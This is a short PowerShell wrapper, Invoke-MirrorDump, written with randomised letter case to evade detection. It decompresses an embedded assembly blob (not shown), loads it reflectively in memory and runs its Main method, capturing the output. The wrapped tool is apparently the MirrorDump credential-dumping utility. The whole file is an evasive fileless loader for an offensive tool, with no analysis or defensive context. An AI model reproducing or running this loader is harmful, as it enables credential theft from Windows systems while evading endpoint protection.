function Invoke-MirrorDump
{
	$DEcoMpRESSEd = nEw-obJEct SYsteM.io.CompREsSION.gzIPsTreaM($a, [sYstEM.iO.COMPrEssION.CompRESsIonMODE]::decOmPRESs)
	$OUtpuT = New-oBjeCt SySTeM.IO.MEmorYstREam
	$dEcoMPReSSEd.copYto( $outPUt )
	[BYte[]]$ByTEOuTarrAy = $OUtPUT.toarrAY()
	$RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load($bYTeOUTArraY)
	$olDconsOLeOuT = [CONSoLe]::out
	$StRInGwritEr = nEW-ObJEct System.IO.STRiNgwRiTEr
	[cONSOLE]::sEtOut($STringWRITer)

	[MirrorDump.Program]::maiN([string[]]$args)

	[cOnsolE]::sEtout($olDCONsOleout)
	$resUlTs = $sTRInGWRiter.TOSTring()
	$rESuLTs
}